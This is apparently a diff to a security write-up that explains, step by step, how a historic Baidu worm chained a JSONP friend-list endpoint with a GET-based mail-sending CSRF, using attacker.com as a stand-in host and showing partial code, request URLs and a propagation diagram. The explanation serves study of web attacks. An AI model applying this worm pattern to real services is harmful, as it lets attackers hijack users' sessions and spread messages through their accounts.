@@ -49,7 +49,9 @@ http://frd.baidu.com/?ct=28&un=用户账户&cm=FriList&tn=bmABCFriList&callback=
 
 The `callback=gotfriends` parameter indicates a **JSONP endpoint** — it returns the friend list wrapped in a function call, readable cross-origin.
 
-### The Worm Logic
+### The Worm Logic — Code Breakdown
+
+**Step 1: Parse the current URL to extract the victim's username**
 
 ```javascript
 var lsURL = window.location.href;
@@ -60,11 +62,67 @@ if (loU.length > 1)
   ……
 ```
 
-The worm parsed its own URL parameters to extract configuration (e.g., the current victim's username), then:
+The worm page URL looks something like:
 
-1. **Read the victim's friend list** via the JSONP endpoint (`callback=gotfriends`)
-2. **Sent a message to every friend** via the mail endpoint (`cm=MailSend`) — the message contained a link to the worm page
-3. Each friend who clicked the link became a new victim, repeating the cycle
+```
+http://attacker.com/worm.html?un=victimName
+```
+
+This code splits the URL at `?` to get the query string, then splits on `&` to extract individual parameters. The worm needs the current victim's username (`un`) to know whose friend list to fetch.
+
+**Why parse the URL?** The worm is a single static page. When it spreads to a new victim, it passes the new victim's username as a URL parameter. Each time the page loads, it reads the username from its own URL to know who to target.
+
+**Step 2: Fetch the victim's friend list via JSONP**
+
+```
+http://frd.baidu.com/?ct=28&un=受害者账户&cm=FriList&tn=bmABCFriList&callback=gotfriends
+```
+
+The worm injects a `<script>` tag pointing to this URL. Baidu returns:
+
+```javascript
+gotfriends(["friend1", "friend2", "friend3", ...])
+```
+
+The worm defines a `gotfriends()` function beforehand to capture the data. Since JSONP wraps the response in a callback, the friend list is now available to the attacker's JavaScript — **this is the "read" capability that makes the worm self-propagating**.
+
+**Step 3: Send the worm link to every friend**
+
+For each friend in the list, the worm triggers a request to:
+
+```
+http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=好友账户&co=点击这个链接...
+```
+
+The `co` (content) parameter contains the worm URL with the **next victim's username** embedded:
+
+```
+http://attacker.com/worm.html?un=好友账户
+```
+
+This can be done by injecting `<img>` tags or iframes — the browser fires the GET request with the victim's cookies, and Baidu sends the message.
+
+**Step 4: Each friend clicks the link → the cycle repeats**
+
+```
+Victim A opens worm page
+  → reads A's friends [B, C, D]
+  → sends worm link to B, C, D
+    → B opens worm page
+      → reads B's friends [E, F]
+      → sends worm link to E, F
+        → exponential spread
+```
+
+### The Three Components That Make a Worm
+
+| Component | How | Code Role |
+|-----------|-----|-----------|
+| **Read data** | JSONP friend list endpoint | Get list of targets to spread to |
+| **Write action** | GET-based mail send endpoint | Deliver the worm payload to each target |
+| **Self-replication** | URL parameter passing + URL parsing | Each new victim page knows who to target next |
+
+Without any one of these three, the worm breaks. Remove the JSONP read → the attacker can't find targets. Remove the mail CSRF → the worm can't spread. Remove the URL parsing → the worm can't adapt to each new victim.
 
 ### Why It Spread
 
